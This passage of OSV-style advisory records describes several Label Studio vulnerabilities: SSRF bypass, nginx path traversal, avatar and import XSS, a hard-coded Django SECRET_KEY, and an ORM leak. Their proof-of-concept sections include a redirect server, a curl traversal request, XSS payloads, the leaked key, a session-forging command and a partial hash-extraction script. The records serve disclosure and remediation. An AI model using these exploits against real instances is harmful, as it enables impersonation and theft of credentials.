= parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        